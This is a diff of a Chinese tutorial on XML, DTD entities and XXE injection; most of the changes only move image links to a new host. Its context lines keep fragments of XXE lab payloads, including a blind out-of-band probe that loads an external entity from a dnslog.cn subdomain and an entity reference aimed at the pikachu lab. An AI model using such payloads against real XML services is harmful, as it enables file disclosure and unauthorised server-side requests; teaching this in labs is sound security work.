@@ -17,15 +17,15 @@ e**X**tensible **M**arkup **L**anguage
 
 ### 配置文件
 
-![image-20221125151509717](https://img.gyxnb.top/img/image-20221125151509717.png)
+![image-20221125151509717](https://image.201068.xyz/assets/image-20221125151509717.png)
 
 ### 交换数据
 
-![image-20221125151538936](https://img.gyxnb.top/img/image-20221125151538936.png)
+![image-20221125151538936](https://image.201068.xyz/assets/image-20221125151538936.png)
 
 ## XML内容
 
-![image-20221125151603048](https://img.gyxnb.top/img/image-20221125151603048.png)
+![image-20221125151603048](https://image.201068.xyz/assets/image-20221125151603048.png)
 
 ### XML格式要求
 
@@ -43,19 +43,19 @@ DTD（Document Type Definition ）
 
 ### DTD内容之元素
 
-![image-20221125151800051](https://img.gyxnb.top/img/image-20221125151800051.png)
+![image-20221125151800051](https://image.201068.xyz/assets/image-20221125151800051.png)
 
 元素 ：ELEMENT
 
 ### DTD内容之实体
 
-![image-20221125151825720](https://img.gyxnb.top/img/image-20221125151825720.png)
+![image-20221125151825720](https://image.201068.xyz/assets/image-20221125151825720.png)
 
 实体 ：ENTITY
 
 ### 实体ENTITY的使用
 
-![image-20221125151901913](https://img.gyxnb.top/img/image-20221125151901913.png)
+![image-20221125151901913](https://image.201068.xyz/assets/image-20221125151901913.png)
 
 内部实体 
 
@@ -63,7 +63,7 @@ INTERNAL [ɪnˈtɜːnl] ENTI
 
 ### 外部实体ENTITY的使用
 
-![image-20221125155403447](https://img.gyxnb.top/img/image-20221125155403447.png)
+![image-20221125155403447](https://image.201068.xyz/assets/image-20221125155403447.png)
 
 ### 外部实体引用：协议
 
@@ -92,13 +92,13 @@ INTERNAL [ɪnˈtɜːnl] ENTI
 
 ### 完整的XML内容
 
-![image-20221125165532725](https://img.gyxnb.top/img/image-20221125165532725.png)
+![image-20221125165532725](https://image.201068.xyz/assets/image-20221125165532725.png)
 
 # 什么是XXE
 
 ## XXE 
 
-![image-20221125165741902](https://img.gyxnb.top/img/image-20221125165741902.png)
+![image-20221125165741902](https://image.201068.xyz/assets/image-20221125165741902.png)
 
 XML外部实体注入 
 
@@ -152,11 +152,11 @@ XML External Entity Injection
 
 ## 微信支付XXE漏洞
 
-![image-20221125175513874](https://img.gyxnb.top/img/image-20221125175513874.png)
+![image-20221125175513874](https://image.201068.xyz/assets/image-20221125175513874.png)
 
 ## 微信支付XXE漏洞
 
-![image-20221125175530987](https://img.gyxnb.top/img/image-20221125175530987.png)
+![image-20221125175530987](https://image.201068.xyz/assets/image-20221125175530987.png)
 
 ## 直打：xxe靶场
 
@@ -166,15 +166,15 @@ XML External Entity Injection
 
 #### 确定使用XML传输数据（抓包可得）
 
-![image-20221125184636443](https://img.gyxnb.top/img/image-20221125184636443.png)
+![image-20221125184636443](https://image.201068.xyz/assets/image-20221125184636443.png)
 
-![image-20221125185102619](https://img.gyxnb.top/img/image-20221125185102619.png)
+![image-20221125185102619](https://image.201068.xyz/assets/image-20221125185102619.png)
 
 
 
 #### 发送到Repeater
 
-![image-20221125190021144](https://img.gyxnb.top/img/image-20221125190021144.png)
+![image-20221125190021144](https://image.201068.xyz/assets/image-20221125190021144.png)
 
 #### 添加DTD，引用外部问文档
 
@@ -194,13 +194,13 @@ XML External Entity Injection
 
 #### Send得到响应
 
-![image-20221125185444129](https://img.gyxnb.top/img/image-20221125185444129.png)
+![image-20221125185444129](https://image.201068.xyz/assets/image-20221125185444129.png)
 
-![image-20221125190115068](https://img.gyxnb.top/img/image-20221125190115068.png)
+![image-20221125190115068](https://image.201068.xyz/assets/image-20221125190115068.png)
 
 ### 盲打-DNSLog
 
-![image-20221125191451126](https://img.gyxnb.top/img/image-20221125191451126.png)
+![image-20221125191451126](https://image.201068.xyz/assets/image-20221125191451126.png)
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
@@ -208,13 +208,13 @@ XML External Entity Injection
 <!ENTITY % remote SYSTEM "http://test.bep1pi.dnslog.cn">%remote;]>
 ```
 
-![image-20221125191612095](https://img.gyxnb.top/img/image-20221125191612095.png)
+![image-20221125191612095](https://image.201068.xyz/assets/image-20221125191612095.png)
 
-![image-20221125191645864](https://img.gyxnb.top/img/image-20221125191645864.png)
+![image-20221125191645864](https://image.201068.xyz/assets/image-20221125191645864.png)
 
 ### 盲打-http接口参数，写入文件
 
-![image-20221125183019656](https://img.gyxnb.top/img/image-20221125183019656.png)
+![image-20221125183019656](https://image.201068.xyz/assets/image-20221125183019656.png)
 
 ## pikachu靶场
 
@@ -227,7 +227,7 @@ http://192.168.70.130/vul/xxe/xxe_1.php
 <foo>&xxe;</foo>
 ```
 
-![image-20221125194627357](https://img.gyxnb.top/img/image-20221125194627357.png)
+![image-20221125194627357](https://image.201068.xyz/assets/image-20221125194627357.png)
 
 # XXE 防御
 
